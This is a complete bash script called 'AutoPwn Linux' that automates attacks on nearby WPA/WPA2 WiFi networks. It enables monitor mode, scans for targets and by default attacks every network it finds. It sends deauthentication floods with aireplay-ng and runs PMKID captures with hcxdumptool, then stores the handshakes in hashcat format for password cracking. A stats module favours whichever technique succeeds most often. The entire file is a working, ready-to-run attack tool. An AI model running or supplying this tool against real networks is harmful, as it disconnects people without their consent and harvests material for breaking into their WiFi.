#!/bin/bash
#############################################
# 🍍 AutoPwn Linux - Universal WiFi Hunter
# Works on: Kali, Ubuntu, Debian, WSL2, etc.
# Supports: RTL8812AU, Atheros, Ralink, etc.
# 
# CHWAŁA JAHWE! 👑
#############################################

VERSION="1.0"
BASEDIR="$HOME/.autopwn"
CAPTURES="$BASEDIR/captures"
LOGS="$BASEDIR/logs"
BRAIN="$BASEDIR/brain"
WORDLISTS="$BASEDIR/wordlists"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Config
INTERFACE=""
SCAN_TIME=30
DEAUTH_COUNT=5
CAPTURE_TIME=40
MIN_SIGNAL=-80
TARGET_MODE="PWNAGOTCHI"  # or specific ESSID

#############################################
# LOGGING
#############################################

log_info() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_attack() { echo -e "${PURPLE}[⚡]${NC} $1"; }
log_success() { echo -e "${GREEN}[🎉]${NC} $1"; }

#############################################
# INITIALIZATION
#############################################

init_dirs() {
    mkdir -p "$CAPTURES" "$LOGS" "$BRAIN" "$WORDLISTS"
    log_info "Directories initialized in $BASEDIR"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log_error "Run as root: sudo $0"
        exit 1
    fi
}

check_dependencies() {
    local deps=("aircrack-ng" "airodump-ng" "aireplay-ng" "iwconfig")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_warn "Missing: ${missing[*]}"
        log_info "Installing aircrack-ng suite..."
        
        if command -v apt-get &> /dev/null; then
            apt-get update && apt-get install -y aircrack-ng
        elif command -v pacman &> /dev/null; then
            pacman -S aircrack-ng
        elif command -v dnf &> /dev/null; then
            dnf install aircrack-ng
        else
            log_error "Cannot auto-install. Please install aircrack-ng manually."
            exit 1
        fi
    fi
    
    # Check for hcxdumptool (PMKID)
    if command -v hcxdumptool &> /dev/null; then
        log_info "hcxdumptool found - PMKID attacks enabled!"
        HAS_HCXDUMPTOOL=1
    else
        log_warn "hcxdumptool not found - PMKID attacks disabled"
        log_warn "Install: apt install hcxdumptool hcxtools"
        HAS_HCXDUMPTOOL=0
    fi
}

#############################################
# INTERFACE DETECTION
#############################################

detect_wifi_interfaces() {
    log_info "Detecting WiFi interfaces..."
    
    # Find all wireless interfaces
    local interfaces=$(iw dev | grep Interface | awk '{print $2}')
    
    if [ -z "$interfaces" ]; then
        log_error "No WiFi interfaces found!"
        exit 1
    fi
    
    echo ""
    echo "Available interfaces:"
    echo "====================="
    
    local i=1
    declare -a iface_array
    
    for iface in $interfaces; do
        local driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}')
        local chipset="Unknown"
        
        # Detect chipset
        case "$driver" in
            rtl8812au|88XXau|8812au)
                chipset="Realtek RTL8812AU (AC1200) ⭐"
                ;;
            ath9k_htc)
                chipset="Atheros AR9271"
                ;;
            ath9k)
                chipset="Atheros AR9xxx"
                ;;
            rt2800usb)
                chipset="Ralink RT2800"
                ;;
            *)
                chipset="$driver"
                ;;
        esac
        
        echo "  $i) $iface - $chipset"
        iface_array+=("$iface")
        ((i++))
    done
    
    echo ""
    
    if [ ${#iface_array[@]} -eq 1 ]; then
        INTERFACE="${iface_array[0]}"
        log_info "Auto-selected: $INTERFACE"
    else
        read -p "Select interface [1-$((i-1))]: " selection
        INTERFACE="${iface_array[$((selection-1))]}"
    fi
}

enable_monitor_mode() {
    log_info "Enabling monitor mode on $INTERFACE..."
    
    # Check if already in monitor mode
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_info "$INTERFACE already in monitor mode"
        return 0
    fi
    
    # Kill interfering processes
    airmon-ng check kill > /dev/null 2>&1
    
    # Enable monitor mode
    ip link set "$INTERFACE" down
    iw dev "$INTERFACE" set type monitor
    ip link set "$INTERFACE" up
    
    # Verify
    if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_success "Monitor mode enabled on $INTERFACE"
    else
        # Try airmon-ng as fallback
        log_warn "Trying airmon-ng..."
        airmon-ng start "$INTERFACE" > /dev/null 2>&1
        INTERFACE="${INTERFACE}mon"
        
        if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
            log_success "Monitor mode enabled on $INTERFACE"
        else
            log_error "Failed to enable monitor mode!"
            exit 1
        fi
    fi
}

disable_monitor_mode() {
    log_info "Disabling monitor mode..."
    
    if [[ "$INTERFACE" == *"mon" ]]; then
        airmon-ng stop "$INTERFACE" > /dev/null 2>&1
    else
        ip link set "$INTERFACE" down
        iw dev "$INTERFACE" set type managed
        ip link set "$INTERFACE" up
    fi
    
    # Restart network manager
    systemctl start NetworkManager 2>/dev/null || service network-manager start 2>/dev/null
}

#############################################
# SCANNING
#############################################

scan_networks() {
    local band="$1"  # bg, a, or abg
    local scanfile="$BASEDIR/tmp/scan_$$"
    
    mkdir -p "$BASEDIR/tmp"
    
    log_info "Scanning networks ($SCAN_TIME sec, band: $band)..."
    
    # Run airodump
    timeout $SCAN_TIME airodump-ng "$INTERFACE" \
        --band "$band" \
        -w "$scanfile" \
        --output-format csv \
        --write-interval 3 > /dev/null 2>&1
    
    # Parse results
    if [ -f "${scanfile}-01.csv" ]; then
        # Extract networks with good signal
        grep -E "WPA|WPA2" "${scanfile}-01.csv" 2>/dev/null | \
        awk -F',' '{
            bssid=$1; 
            channel=$4; 
            signal=$9; 
            essid=$14;
            gsub(/^ +| +$/, "", bssid);
            gsub(/^ +| +$/, "", channel);
            gsub(/^ +| +$/, "", signal);
            gsub(/^ +| +$/, "", essid);
            if (signal+0 > -85 && length(essid) > 0 && essid !~ /^[[:space:]]*$/) {
                print bssid","channel","signal","essid
            }
        }' | sort -t',' -k3 -nr | head -20 > "$BASEDIR/tmp/targets.txt"
        
        local count=$(wc -l < "$BASEDIR/tmp/targets.txt" 2>/dev/null || echo 0)
        log_info "Found $count WPA/WPA2 networks"
        
        rm -f ${scanfile}* 2>/dev/null
        return 0
    fi
    
    rm -f ${scanfile}* 2>/dev/null
    return 1
}

show_targets() {
    echo ""
    echo "┌─────────────────────────────────────────────────────────────┐"
    echo "│                    DISCOVERED NETWORKS                       │"
    echo "├────┬───────────────────┬─────┬────────┬─────────────────────┤"
    echo "│ #  │ BSSID             │ CH  │ Signal │ ESSID               │"
    echo "├────┼───────────────────┼─────┼────────┼─────────────────────┤"
    
    local i=1
    while IFS=',' read -r bssid channel signal essid; do
        printf "│ %-2s │ %-17s │ %-3s │ %-6s │ %-19s │\n" \
            "$i" "$bssid" "$channel" "${signal}dBm" "${essid:0:19}"
        ((i++))
    done < "$BASEDIR/tmp/targets.txt"
    
    echo "└────┴───────────────────┴─────┴────────┴─────────────────────┘"
    echo ""
}

#############################################
# ATTACKS
#############################################

attack_deauth() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    log_attack "Deauth attack on $essid (ch:$channel)..."
    
    local capfile="$BASEDIR/tmp/cap_$$"
    
    # Set channel
    iwconfig "$INTERFACE" channel "$channel" 2>/dev/null
    sleep 1
    
    # Start capture in background
    airodump-ng "$INTERFACE" \
        -c "$channel" \
        --bssid "$bssid" \
        -w "$capfile" \
        --output-format pcap > /dev/null 2>&1 &
    local cap_pid=$!
    
    sleep 3
    
    # Send deauth packets
    for i in $(seq 1 3); do
        aireplay-ng -0 $DEAUTH_COUNT -a "$bssid" "$INTERFACE" > /dev/null 2>&1
        sleep 2
    done
    
    # Wait for handshake
    sleep 20
    
    # Stop capture
    kill $cap_pid 2>/dev/null
    wait $cap_pid 2>/dev/null
    
    # Check for handshake
    if [ -f "${capfile}-01.cap" ]; then
        local result=$(aircrack-ng "${capfile}-01.cap" 2>&1)
        if echo "$result" | grep -q "1 handshake"; then
            log_success "HANDSHAKE CAPTURED: $essid"
            mv "${capfile}-01.cap" "$CAPTURES/${essid}_$(date +%Y%m%d_%H%M%S).cap"
            record_success "$channel" "$essid" "deauth"
            rm -f ${capfile}* 2>/dev/null
            return 0
        fi
    fi
    
    rm -f ${capfile}* 2>/dev/null
    record_failure "$channel" "$essid" "deauth"
    return 1
}

attack_pmkid() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    [ "$HAS_HCXDUMPTOOL" -eq 0 ] && return 1
    
    log_attack "PMKID attack on $essid (ch:$channel)..."
    
    local capfile="$BASEDIR/tmp/pmkid_$$"
    
    # Set channel
    iwconfig "$INTERFACE" channel "$channel" 2>/dev/null
    sleep 1
    
    # Create filter file
    echo "$bssid" | tr -d ':' > "$BASEDIR/tmp/filter.txt"
    
    # Run hcxdumptool
    timeout 30 hcxdumptool \
        -i "$INTERFACE" \
        -o "${capfile}.pcapng" \
        --filterlist_ap="$BASEDIR/tmp/filter.txt" \
        --filtermode=2 \
        --enable_status=1 > /dev/null 2>&1
    
    # Convert to hashcat format
    if [ -f "${capfile}.pcapng" ]; then
        hcxpcapngtool -o "${capfile}.22000" "${capfile}.pcapng" 2>/dev/null
        
        if [ -f "${capfile}.22000" ] && [ -s "${capfile}.22000" ]; then
            log_success "PMKID CAPTURED: $essid"
            mv "${capfile}.22000" "$CAPTURES/${essid}_pmkid_$(date +%Y%m%d_%H%M%S).22000"
            mv "${capfile}.pcapng" "$CAPTURES/${essid}_pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
            record_success "$channel" "$essid" "pmkid"
            rm -f "$BASEDIR/tmp/filter.txt" 2>/dev/null
            return 0
        fi
    fi
    
    rm -f ${capfile}* "$BASEDIR/tmp/filter.txt" 2>/dev/null
    record_failure "$channel" "$essid" "pmkid"
    return 1
}

#############################################
# LEARNING (Simple stats-based)
#############################################

init_brain() {
    # Channel success rates
    if [ ! -f "$BRAIN/channels.db" ]; then
        for ch in $(seq 1 14) $(seq 36 4 165); do
            echo "$ch|0|0|50" >> "$BRAIN/channels.db"
        done
    fi
    
    # Technique success rates
    if [ ! -f "$BRAIN/techniques.db" ]; then
        echo "deauth|0|0|50" > "$BRAIN/techniques.db"
        echo "pmkid|0|0|50" >> "$BRAIN/techniques.db"
    fi
}

record_success() {
    local channel="$1"
    local essid="$2"
    local technique="$3"
    
    update_score "$BRAIN/channels.db" "$channel" 1
    update_score "$BRAIN/techniques.db" "$technique" 1
    
    log_info "🧠 Learned: ch=$channel tech=$technique -> SUCCESS"
}

record_failure() {
    local channel="$1"
    local essid="$2"
    local technique="$3"
    
    update_score "$BRAIN/channels.db" "$channel" 0
    update_score "$BRAIN/techniques.db" "$technique" 0
}

update_score() {
    local file="$1"
    local key="$2"
    local success="$3"
    
    [ ! -f "$file" ] && return
    
    local line=$(grep "^${key}|" "$file")
    [ -z "$line" ] && return
    
    local attempts=$(echo "$line" | cut -d'|' -f2)
    local successes=$(echo "$line" | cut -d'|' -f3)
    
    attempts=$((attempts + 1))
    [ "$success" -eq 1 ] && successes=$((successes + 1))
    
    local weight=50
    [ "$attempts" -gt 0 ] && weight=$((successes * 100 / attempts))
    [ "$weight" -lt 5 ] && weight=5
    [ "$weight" -gt 95 ] && weight=95
    
    sed -i "s/^${key}|.*/${key}|${attempts}|${successes}|${weight}/" "$file"
}

get_best_technique() {
    [ ! -f "$BRAIN/techniques.db" ] && echo "deauth" && return
    
    local best=$(sort -t'|' -k4 -nr "$BRAIN/techniques.db" | head -1 | cut -d'|' -f1)
    echo "${best:-deauth}"
}

show_brain_stats() {
    echo ""
    echo "┌─────────────────────────────────────────┐"
    echo "│           🧠 BRAIN STATISTICS           │"
    echo "├─────────────────────────────────────────┤"
    
    echo "│ Techniques:                             │"
    while IFS='|' read -r tech attempts successes weight; do
        printf "│   %-10s: %3s%% (%s/%s)            │\n" "$tech" "$weight" "$successes" "$attempts"
    done < "$BRAIN/techniques.db"
    
    echo "├─────────────────────────────────────────┤"
    echo "│ Top Channels:                           │"
    sort -t'|' -k4 -nr "$BRAIN/channels.db" | head -5 | while IFS='|' read -r ch attempts successes weight; do
        printf "│   Channel %-3s: %3s%%                    │\n" "$ch" "$weight"
    done
    
    echo "└─────────────────────────────────────────┘"
}

#############################################
# MAIN ATTACK LOOP
#############################################

smart_attack() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    local best_tech=$(get_best_technique)
    log_info "Best technique: $best_tech"
    
    case "$best_tech" in
        pmkid)
            attack_pmkid "$bssid" "$channel" "$essid" && return 0
            attack_deauth "$bssid" "$channel" "$essid" && return 0
            ;;
        *)
            attack_deauth "$bssid" "$channel" "$essid" && return 0
            attack_pmkid "$bssid" "$channel" "$essid" && return 0
            ;;
    esac
    
    return 1
}

main_loop() {
    local cycle=0
    local max_cycles="${1:-999999}"
    
    echo ""
    echo "╔═══════════════════════════════════════════╗"
    echo "║     🍍 AutoPwn Linux v$VERSION             ║"
    echo "║     CHWAŁA JAHWE! 👑                     ║"
    echo "╚═══════════════════════════════════════════╝"
    echo ""
    
    init_brain
    
    while [ $cycle -lt $max_cycles ]; do
        ((cycle++))
        log_info "=== Cycle #$cycle ==="
        
        # Scan both bands
        scan_networks "abg"
        
        if [ -f "$BASEDIR/tmp/targets.txt" ] && [ -s "$BASEDIR/tmp/targets.txt" ]; then
            show_targets
            
            while IFS=',' read -r bssid channel signal essid; do
                [ -z "$bssid" ] && continue
                [ -z "$essid" ] && continue
                
                # Check target mode
                if [ "$TARGET_MODE" != "PWNAGOTCHI" ] && [ "$essid" != "$TARGET_MODE" ]; then
                    continue
                fi
                
                # Skip already captured
                if ls "$CAPTURES"/*"$essid"* > /dev/null 2>&1; then
                    log_info "Skipping $essid (already captured)"
                    continue
                fi
                
                smart_attack "$bssid" "$channel" "$essid"
                sleep 5
                
            done < "$BASEDIR/tmp/targets.txt"
        else
            log_warn "No networks found"
        fi
        
        # Stats
        local cap_count=$(ls "$CAPTURES"/*.cap "$CAPTURES"/*.22000 2>/dev/null | wc -l)
        log_info "📊 Captured: $cap_count handshakes/PMKIDs"
        
        log_info "💤 Sleeping 30s..."
        sleep 30
    done
}

#############################################
# CLI
#############################################

show_help() {
    echo "🍍 AutoPwn Linux v$VERSION"
    echo ""
    echo "Usage: $0 [command] [options]"
    echo ""
    echo "Commands:"
    echo "  start [cycles]    Start hunting (default: infinite)"
    echo "  scan              Scan networks once"
    echo "  attack <essid>    Attack specific network"
    echo "  status            Show stats and captures"
    echo "  stop              Stop and restore interface"
    echo ""
    echo "Options:"
    echo "  -i <interface>    Specify interface"
    echo "  -t <essid>        Target specific network"
    echo ""
    echo "Examples:"
    echo "  sudo $0 start"
    echo "  sudo $0 scan"
    echo "  sudo $0 attack MyWiFi"
    echo "  sudo $0 -t HomeNetwork start"
}

show_status() {
    echo ""
    echo "🍍 AutoPwn Linux v$VERSION"
    echo "========================="
    echo ""
    echo "📁 Captures: $(ls "$CAPTURES"/*.cap "$CAPTURES"/*.22000 2>/dev/null | wc -l)"
    echo ""
    echo "Recent captures:"
    ls -lt "$CAPTURES"/ 2>/dev/null | head -5
    
    show_brain_stats
}

cleanup() {
    log_info "Cleaning up..."
    killall airodump-ng aireplay-ng hcxdumptool 2>/dev/null
    disable_monitor_mode
    rm -rf "$BASEDIR/tmp" 2>/dev/null
    log_info "Done!"
}

trap cleanup EXIT INT TERM

#############################################
# MAIN
#############################################

# Parse arguments
while getopts "i:t:h" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        t) TARGET_MODE="$OPTARG" ;;
        h) show_help; exit 0 ;;
    esac
done
shift $((OPTIND-1))

case "${1:-help}" in
    start)
        check_root
        init_dirs
        check_dependencies
        [ -z "$INTERFACE" ] && detect_wifi_interfaces
        enable_monitor_mode
        main_loop "${2:-999999}"
        ;;
    scan)
        check_root
        init_dirs
        check_dependencies
        [ -z "$INTERFACE" ] && detect_wifi_interfaces
        enable_monitor_mode
        scan_networks "abg"
        show_targets
        ;;
    attack)
        check_root
        init_dirs
        check_dependencies
        [ -z "$INTERFACE" ] && detect_wifi_interfaces
        enable_monitor_mode
        TARGET_MODE="$2"
        scan_networks "abg"
        main_loop 1
        ;;
    status)
        show_status
        ;;
    stop)
        cleanup
        ;;
    *)
        show_help
        ;;
esac
